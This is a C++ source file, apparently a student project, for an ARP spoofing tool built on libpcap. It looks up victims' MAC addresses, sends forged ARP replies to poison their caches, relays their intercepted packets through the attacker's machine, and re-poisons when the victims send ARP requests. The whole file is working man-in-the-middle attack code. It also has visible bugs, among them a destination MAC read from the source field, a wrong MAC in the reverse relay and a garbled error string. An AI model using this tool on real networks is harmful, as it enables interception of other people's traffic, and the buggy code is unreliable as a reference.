#include <main.h>
#include <util.h>
#include <arp.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <vector>
#include <thread>

static MacManager localMacAddress;
static IpManager  localIpAddress;

// Print Usage
void usage() {
    printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// get mac addresses thread
void getMacAddresses(IN pcap_t *handle, OUT ArpSession *arpSession) {
    MacManager senderMacAddress(arpSession->senderMacAddress);
    MacManager targetMacAddress(arpSession->targetMacAddress);
    IpManager  senderIpAddress (arpSession->senderIpAddress);
    IpManager  targetIpAddress (arpSession->targetIpAddress);

    // Get Sender MAC Address
    printf("[*] 1. Get Sender MAC Address\n");
    getSenderMacAddress(handle, localMacAddress, localIpAddress, senderIpAddress, senderMacAddress);
    senderMacAddress.printMacAddress("[+] Sender MAC Address : ");
    memcpy(arpSession->senderMacAddress, senderMacAddress, MacManager::LENGTH);
    printf("\n");

    // Get Target MAC Address
    printf("[*] 2. Get Target MAC Address\n");
    getSenderMacAddress(handle, localMacAddress, localIpAddress, targetIpAddress, targetMacAddress);
    memcpy(arpSession->targetMacAddress, targetMacAddress, MacManager::LENGTH);
    targetMacAddress.printMacAddress("[+] Target MAC Address : ");
    printf("\n\n");
}

// relay packet thread
void relayPacket(IN pcap_t *handle, IN std::vector<ArpSession> arpSessions) {
    int idx;
    std::vector<ArpSession>::iterator arpSessionIterator;

    while(1) {
        struct pcap_pkthdr *pcapHeader;
        const u_char *packet;
        if(pcap_next_ex(handle, &pcapHeader, &packet) < 0) {
            fprintf(stderr, "[-] Failed to receive packet\n");
            break;
        }

        // parse Ethernet Packet
        EthernetStructure *ethernetPacket = (EthernetStructure *)packet;

        // relay packet
        for(arpSessionIterator = arpSessions.begin(); arpSessionIterator != arpSessions.end(); arpSessionIterator++) {
            MacManager sourceMacAddress     (ethernetPacket->sourceMacAddress);
            MacManager destinationMacAddress(ethernetPacket->sourceMacAddress);
            MacManager senderMacAddress(arpSessionIterator->senderMacAddress);
            MacManager targetMacAddress(arpSessionIterator->targetMacAddress);

            // Sender -> Target (Sender -> Attacker -> Target)
            if(sourceMacAddress == senderMacAddress && destinationMacAddress == localMacAddress) { // A -> R -> B
                printf("[*] Relay Packet\n");
                memcpy(ethernetPacket->destinationMacAddress, arpSessionIterator->targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
                memcpy(ethernetPacket->sourceMacAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
                if(pcap_sendpacket(handle, packet, pcapHeader->caplen)) {
                    fprintf(stderr, "[-] Failed to send relay packet\n");
                    break;
                }
            } else
            // Target -> Sender (Target -> Attacker -> Sender)
            if(sourceMacAddress == targetMacAddress && destinationMacAddress == localMacAddress) { // A <- R <- B
                printf("[*] Relay Packet\n");
                memcpy(ethernetPacket->destinationMacAddress, arpSessionIterator->targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
                memcpy(ethernetPacket->sourceMacAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
                if(pcap_sendpacket(handle, packet, pcapHeader->caplen)) {
                    fprintf(stderr, "[-] Failed to send relay packet\n");
                    break;
                }
            // Except partial ARP Packet(refresh arp table)
            } else if(ntohs(ethernetPacket->type) == ETHERNET_TYPE_ARP) {
                ArpStructure *arpPacket = (ArpStructure *)(packet + sizeof(EthernetStructure));
                MacManager broadcastMacAddress;
                broadcastMacAddress.setBroadcast();

                // print packet info
                printArpPacketInfo(*arpPacket);

                // ARP Request (Sender -> Broadcast)
                if(sourceMacAddress == senderMacAddress && destinationMacAddress == broadcastMacAddress
                    && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
                    printf("[!] Reinfect Sender\n");
                    sleep(0.1); // wait real ARP reply
                    infectSender(handle, localMacAddress, *arpSessionIterator, 2); // send infect arp packet
                } else 
                // ARP Request (Target -> Broadcast)
                if(sourceMacAddress == targetMacAddress && destinationMacAddress == broadcastMacAddress
                    && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
                    printf("[!] Reinfect Sender\n");
                    sleep(0.1); // wait real ARP reply
                    infectSender(handle, localMacAddress, *arpSessionIterator, 2); // send infect arp packet
                }
            }
        }
    }
}

// Main Function
int main(int argc, char* argv[]) {
    int ret = EXIT_FAILURE;
    pcap_t *handle = NULL;
    std::vector<ArpSession> arpSessions;
    std::vector<ArpSession>::iterator sessionIterator;
    std::vector<std::thread> threads;
    std::vector<std::thread>::iterator threadIterator;
    std::thread relayThread;
    struct in_addr laddr;

    int idx;
    char errbuf[PCAP_ERRBUF_SIZE];

    // check arguments validation
    if (argc < 4 || argc % 2) {
        usage();
        goto end;
    }

    // allocate memory
    arpSessions.reserve((argc-2) >> 1);
    threads.reserve((argc-2) >> 1);

    // get packet using pcap library
    if(!(handle = pcap_open_live(argv[1], BUFSIZ, 1, 1024, errbuf))) {
        fprintf(stderr, "[-] couldn't open devicnetinet/if_ether.he %s: %s\n", argv[1], errbuf);
        goto end;
    }

    // initialize local address
    if(getLocalMacAddress(argv[1], localMacAddress) == EXIT_FAILURE) {
        fprintf(stderr, "[-] Invalid Attacker MAC Address!\n");
        goto end;
    }

    // initialize local address
    if(getLocalIpAddress(argv[1], localIpAddress) == EXIT_FAILURE) {
        fprintf(stderr, "[-] Failed to get IP Address!\n");
        goto end;
    }

    // initialize ARP Session Vector
    for(idx=2; idx<argc; idx+=2) {
        ArpSession currentSession;

        if(inet_aton(argv[idx], &laddr) < 0) {
            fprintf(stderr, "[-] IP Address Format Invalid!\n");
            goto end;
        }
        memcpy(currentSession.senderIpAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
        if(inet_aton(argv[idx+1], &laddr) < 0) {
            fprintf(stderr, "[-] IP Address Format Invalid!\n");
            goto end;
        }
        memcpy(currentSession.targetIpAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);

        arpSessions.push_back(currentSession);
    }

    // initialize Get Mac Address Thread
    for(sessionIterator = arpSessions.begin(); sessionIterator != arpSessions.end(); sessionIterator++) {
        threads.emplace_back(getMacAddresses, handle, &(*sessionIterator));
    }

    // wait to find MAC Address
    for(threadIterator=threads.begin(); threadIterator != threads.end(); threadIterator++) {
        (*threadIterator).join();
    }
    threads.clear();

    // start relay thread
    relayThread = std::thread(relayPacket, handle, arpSessions);

    // Spoofing MAC Address
    printf("[*] 3. ARP Spoofing\n");
    for(sessionIterator = arpSessions.begin(); sessionIterator != arpSessions.end(); sessionIterator++) {
        infectSender(handle, localMacAddress, *sessionIterator);
    }

    ret = EXIT_SUCCESS; 

end:
    if(handle) {
        pcap_close(handle);
    }
    return ret;
}
